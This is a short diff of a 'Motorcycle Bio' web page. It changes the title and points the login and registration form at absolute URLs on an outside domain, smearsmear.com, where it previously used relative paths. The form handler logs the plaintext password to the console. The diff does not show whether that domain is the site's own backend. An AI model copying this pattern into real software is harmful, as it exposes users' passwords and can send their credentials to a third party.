@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Motorcycle Bio 4</title>
+    <title>Motorcycle Bio 3</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -106,7 +106,7 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const isLogin = event.submitter.id === 'login-btn';
-            const endpoint = isLogin ? '/login' : '/register';
+            const endpoint = isLogin ? 'https://smearsmear.com/login' : 'https://smearsmear.com/register';
 
             console.log('Form submitted:', { username, email, password });
 
